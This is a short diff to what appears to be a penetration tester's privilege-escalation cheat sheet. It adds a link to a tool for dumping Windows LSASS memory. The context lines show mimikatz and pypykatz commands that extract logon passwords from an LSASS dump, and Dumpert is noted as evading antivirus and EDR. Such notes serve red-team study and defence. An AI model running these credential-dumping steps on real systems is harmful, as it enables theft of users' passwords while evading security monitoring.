@@ -362,6 +362,7 @@ PrivEsc
         Move to offline system; rename to debugXX.gz -> decompress
         minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
     Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
+    BOF Minidump: https://github.com/rookuu/BOFs/tree/main/MiniDumpWriteDump
     
   Python dmp tool: pypykatz (install: pip3 install pypykatz)
         python -m pypykatz lsa minidump lsass.DMP 
